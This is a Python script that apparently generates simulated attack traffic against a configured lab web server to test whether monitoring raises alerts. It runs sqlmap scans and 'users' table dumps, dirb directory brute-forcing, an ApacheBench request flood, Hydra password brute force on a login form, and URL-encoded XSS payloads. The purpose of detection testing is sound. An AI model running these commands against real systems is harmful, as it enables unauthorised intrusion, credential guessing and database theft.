import os
from utils.console_logger import log
from helpers.config import (
    WEB_SVR,
    DIR_WORD_LIST_PATH,
    SQLMAP_QUERY_PATH,
    PATH_TO_WD_DATA,
    WEB_DEFACEMENT_ENTRY,
    PW_WORD_LIST_PATH,
    WEB_SVR_USER,
    WEB_SVR_LOGIN_PATH,
    HYDRA_FAILURE_MSG,
    XSS_PAYLOADS,
)


def generate_benign():
    """
    Generates a benign HTTP request to the web server. This should not trigger any alerts.
    """
    os.system(f"curl -s http://{WEB_SVR}")
    log("success", "Benign HTTP request sent")


def generate_badbot():
    """
    Generates a HTTP request to the web server with a known bad bot user agent. This should trigger an alert.
    """

    word_list_dir = os.getcwd() + "/" + DIR_WORD_LIST_PATH

    os.system(f"sqlmap -u http://{WEB_SVR}/{SQLMAP_QUERY_PATH} --dbs --batch")
    os.system(f"dirb http://{WEB_SVR} {word_list_dir} -r -S -a dirb")

    log("success", "Bad bot HTTP request sent")


def generate_unusual_pattern():
    """
    Generates a large number of HTTP requests to the web server in a short period of time. This should trigger an alert.
    """

    os.system(f"ab -n 1000 -c 100 http://{WEB_SVR}/")

    log("success", "Unusual pattern HTTP request sent")


def generate_web_defacement():
    """
    Adds entry to the web defacement log. This should trigger an alert. (Run on IIS server)
    """
    os.system(f"echo {WEB_DEFACEMENT_ENTRY} >> {PATH_TO_WD_DATA}")
    log("success", "Web defacement report added")


def generate_brute_force():
    """
    Generates multiple failed login attempts to the web server. This should trigger an alert.
    """
    word_list_dir = os.getcwd() + "/" + PW_WORD_LIST_PATH

    command = (
        f"hydra -l {WEB_SVR_USER} -P {word_list_dir} {WEB_SVR} http-post-form"
        f'"{WEB_SVR_LOGIN_PATH}:user=^USER^&pass=^PASS^:F={HYDRA_FAILURE_MSG}"'
    )
    os.system(command)
    log("success", "Brute force attack sent")


def generate_sqli():
    """
    Generates logs that reflect SQL injection attempts.
    """

    target_url = f"http://{WEB_SVR}/{SQLMAP_QUERY_PATH}"
    sqlmap_cmds = [
        "--dbs --batch",
        "-D users --dump --batch",
        "--tamper=randomcase --random-agent --level=5 --risk=3 --batch",
        "--tables -D users --batch",
        "--columns -D users -T users --batch",
    ]

    for cmd in sqlmap_cmds:
        os.system(f"sqlmap -u {target_url} {cmd}")
    log("success", "SQLi attack simulations completed")


def generate_xss():
    """
    Generates logs that reflect cross-site scripting attempts.
    """
    for payload in XSS_PAYLOADS:
        encoded_payload = (
            payload.replace(" ", "%20")
            .replace("<", "%3C")
            .replace(">", "%3E")
            .replace('"', "%22")
            .replace("'", "%27")
            .replace("=", "%3D")
        )
        os.system(
            f"curl -G http://{WEB_SVR} --data-urlencode 'ctl00$BodyContentPlaceholder$txt_email={encoded_payload}'"
        )

    log("success", "XSS attack simulations completed")
